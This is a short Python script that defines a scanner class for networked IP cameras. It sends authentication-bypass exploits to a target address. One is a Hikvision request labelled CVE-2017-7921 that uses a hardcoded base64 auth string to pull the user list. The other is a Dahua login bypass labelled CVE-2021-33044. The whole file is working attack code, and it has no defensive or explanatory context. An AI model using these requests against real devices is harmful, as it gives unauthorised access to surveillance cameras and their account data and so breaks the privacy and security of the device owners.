import requests
from typing import Optional, Dict
from dataclasses import dataclass

@dataclass
class TargetDevice:
    ip: str
    port: int = 80
    vendor: Optional[str] = None

class VulnerabilityScanner:
    def __init__(self, target: TargetDevice):
        self.target = target

    def scan(self) -> Optional[Dict]:
        # Hikvision backdoor CVE-2017-7921
        try:
            url = f"http://{self.target.ip}:{self.target.port}/Security/users?auth=YWRtaW46MTEK"
            r = requests.get(url, timeout=5)
            if r.status_code == 200 and 'admin' in r.text:
                return {'method': 'CVE-2017-7921', 'data': r.text}
        except:
            pass

        # Dahua bypass CVE-2021-33044
        try:
            url = f"http://{self.target.ip}:{self.target.port}/cgi-bin/userLogin"
            data = {'username': 'admin', 'password': 'any', 'session': '00000000'}
            r = requests.post(url, data=data, timeout=5)
            if r.status_code == 200 and 'success' in r.text.lower():
                return {'method': 'CVE-2021-33044'}
        except:
            pass

        return None
